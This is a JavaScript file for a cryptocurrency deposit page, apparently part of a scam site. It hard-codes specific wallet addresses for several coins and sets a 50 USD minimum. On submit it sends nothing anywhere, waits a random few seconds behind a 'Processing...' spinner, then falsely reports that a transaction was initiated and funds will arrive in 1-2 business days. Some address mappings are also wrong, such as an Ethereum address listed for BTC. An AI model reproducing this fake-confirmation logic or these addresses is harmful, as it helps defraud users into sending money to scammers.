const data = {
    "BCH": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "Bitcoin Cash": "1MnL9Ku1PG9ti6erSFtbu7BFecZNJDhCH4",
      "ERC20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "BTC": {
      "default": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "DOGE": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "ETH": {
      "ERC20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "LTC": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "litecoin": "LTekL2psRuEk6tNXUd6ZjDoNZb8NBJLx6p"
    },
    "SOL": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "solana chain": "DhNbE4HHUGsBuoo8YPqCFJaoGG8AdFt2aEYUG9kG8qAx"
    },
    "Trump": {
      "solana": "DhNbE4HHUGsBuoo8YPqCFJaoGG8AdFt2aEYUG9kG8qAx"
    },
    "USDT": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "XRP": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "ERC20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    }
  };
  
  const cryptoSelect = document.getElementById("crypto");
  const networkSelect = document.getElementById("network");
  const qrImage = document.getElementById("qrImage");
  const walletAddress = document.getElementById("walletAddress");
  
  // Populate crypto dropdown
  document.addEventListener("DOMContentLoaded", () => {
    cryptoSelect.innerHTML = '<option value="">--Choose Crypto--</option>';
    for (let crypto in data) {
      const option = document.createElement("option");
      option.value = crypto;
      option.textContent = crypto;
      if (crypto === "USDT") option.selected = true; // Set USDT as default
      cryptoSelect.appendChild(option);
    }
  
    // Trigger change event to populate network dropdown
    cryptoSelect.dispatchEvent(new Event("change"));
  
    // Set BEP20 as default for USDT
    if (cryptoSelect.value === "USDT") {
      for (let i = 0; i < networkSelect.options.length; i++) {
        if (networkSelect.options[i].value === "BEP20") {
          networkSelect.selectedIndex = i;
          break;
        }
      }
      // Trigger change event to show QR and address
      networkSelect.dispatchEvent(new Event("change"));
    }
  });
  
  // When crypto changes, populate network dropdown
  cryptoSelect.addEventListener("change", () => {
    const selectedCrypto = cryptoSelect.value;
    networkSelect.innerHTML = '<option value="">--Choose Network--</option>';

    let firstNetwork = null;
    if (data[selectedCrypto]) {
      for (let network in data[selectedCrypto]) {
        const option = document.createElement("option");
        option.value = network;
        option.textContent = network;
        networkSelect.appendChild(option);
        if (!firstNetwork) firstNetwork = network;
      }
    }

    // Auto-select the first network and show QR/address
    if (firstNetwork) {
      networkSelect.value = firstNetwork;
      networkSelect.dispatchEvent(new Event("change"));
    } else {
      qrImage.src = "";
      walletAddress.textContent = "";
    }
  });
  
  // When network changes, show QR code and address
  networkSelect.addEventListener("change", () => {
    const crypto = cryptoSelect.value;
    const network = networkSelect.value;
  
    const address = data[crypto][network];
    walletAddress.textContent = address || "Address not found.";
  
    // Use exact dropdown value for filename, matching your repo
    let filename;
    if (network === "default") {
      filename = `assets/qrcodes/${crypto}.jpg`;
    } else {
      filename = `assets/qrcodes/${crypto}(${network}).jpg`;
    }
    qrImage.src = filename;
  });
  
  // Optional: Copy address to clipboard
  function copyAddress() {
    const text = walletAddress.textContent;
    if (!text || text === "Address not found.") return;
    navigator.clipboard.writeText(text);
    alert("Address copied!");
  }
  
  // Show error message below the amount input
  const amountInput = document.getElementById("amount");
  let amountError = document.createElement("div");
  amountError.style.color = "#f87171";
  amountError.style.fontSize = "0.95em";
  amountError.style.marginBottom = "8px";
  amountInput.parentNode.insertBefore(amountError, amountInput.nextSibling);
  
  // Show success message after submit
  let submitMsg = document.createElement("div");
  submitMsg.style.color = "#22c55e";
  submitMsg.style.fontWeight = "600";
  submitMsg.style.textAlign = "center";
  submitMsg.style.marginTop = "16px";
  document.querySelector('.container').appendChild(submitMsg);
  
  amountInput.addEventListener("input", function() {
    const value = amountInput.value;
    // Only allow numbers and dot
    if (!/^\d*\.?\d*$/.test(value)) {
      amountError.textContent = "Please enter a valid number (no special characters).";
    } else if (parseFloat(value) < 50) {
      amountError.textContent = "Minimum amount is 50 USD.";
    } else {
      amountError.textContent = "";
    }
  });
  
  function submitForm() {
    const amountValue = amountInput.value;
    const screenshotInput = document.getElementById('screenshot');
    if (!/^\d*\.?\d+$/.test(amountValue) || parseFloat(amountValue) < 50) {
      amountError.textContent = (!/^\d*\.?\d+$/.test(amountValue)) ? "Please enter a valid number (no special characters)." : "Minimum amount is 50 USD.";
      submitMsg.textContent = "";
      return;
    }
    if (!screenshotInput.files || screenshotInput.files.length === 0) {
      amountError.textContent = "Please upload transaction screenshot.";
      submitMsg.textContent = "";
      return;
    }
    amountError.textContent = "";

    // Show modal overlay
    const modal = document.getElementById('modalOverlay');
    const spinner = document.getElementById('modalSpinner');
    const check = document.getElementById('modalCheck');
    const msg = document.getElementById('modalMsg');
    const okBtn = document.getElementById('modalOkBtn');
    modal.style.display = 'flex';
    spinner.style.display = 'none';
    check.style.display = 'none';
    msg.textContent = '';
    okBtn.style.display = 'none';

    // Show custom circle loader and processing text
    spinner.innerHTML = `<div class='circle-loader'></div><div style='color:#fff;font-size:1.1rem;margin-top:10px;'>Processing...</div>`;
    spinner.style.display = 'block';

    // Random delay between 4-20 seconds
    const delay = 4000 + Math.floor(Math.random() * 16000);
    setTimeout(() => {
      spinner.style.display = 'none';
      spinner.innerHTML = '';
      check.style.display = 'block';
      msg.innerHTML = `<div style='color:#fff;font-size:1.15rem;margin-bottom:8px;'>Due to blockchain traffic your assets will be reflect in 1-2 business days</div><div style='color:#fff;font-size:1.15rem;'>Crypto Transaction initiated to your designated address</div>`;
      okBtn.style.display = 'block';
      okBtn.onclick = function() {
        modal.style.display = 'none';
        window.location.reload();
      };
    }, delay);
  }